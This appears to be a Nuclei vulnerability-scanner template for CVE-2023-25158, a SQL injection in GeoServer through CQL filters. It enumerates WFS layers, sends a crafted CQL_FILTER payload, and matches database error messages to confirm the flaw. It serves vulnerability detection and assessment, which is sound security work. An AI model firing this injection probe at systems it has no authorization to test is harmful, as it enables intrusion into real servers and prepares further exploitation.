id: CVE-2023-25158

info:
  name: GeoServer - SQL Injection (CVE-2023-25158)
  author: gustavo-keiller
  severity: critical
  description: |
    GeoTools < 27.4, 28.2 contains a SQL injection vulnerability via unsanitized OGC Filter expressions.
    This template uses a valid CQL payload ('x''y') to bypass the initial parser and trigger a SQL syntax error in the backend database.

    NOTE: Exploitation requires a specific configuration (Encode Functions Enabled + SQL Backend).
  reference:
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
  tags: cve,cve2023,geoserver,sqli,wfs,intrusive

http:
  - raw:
      # Step 1: ENUMERATION
      - |
        GET /geoserver/wfs?service=WFS&request=GetCapabilities HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: valid_layer
        internal: true
        group: 1
        regex:
          - '<(?:wfs:)?Name>([a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+)</(?:wfs:)?Name>'

  - raw:
      # Step 2: EXPLOITATION
      - |
        GET /geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName={{valid_layer}}&CQL_FILTER=strStartsWith%28name%2C%27x%27%27y%27%29+%3D+true HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Unterminated string literal"
          - "Translator error"
          - "Syntax error in SQL statement"
          - "PSQLException"
        condition: or

      - type: status
        status:
          - 200
          - 500
